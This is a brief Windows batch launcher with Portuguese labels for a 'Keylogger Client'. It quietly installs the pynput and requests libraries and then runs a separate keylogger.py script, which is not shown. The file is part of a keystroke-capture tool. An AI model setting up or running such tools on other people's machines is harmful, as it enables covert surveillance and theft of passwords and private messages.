@echo off
title Keylogger Client - Monitoramento Local
echo Verificando bibliotecas necessarias...
python -m pip install pynput requests >nul 2>&1
echo.
echo --- MONITORAMENTO ATIVO ---
echo As teclas aparecerao abaixo:
echo.
python keylogger.py
pause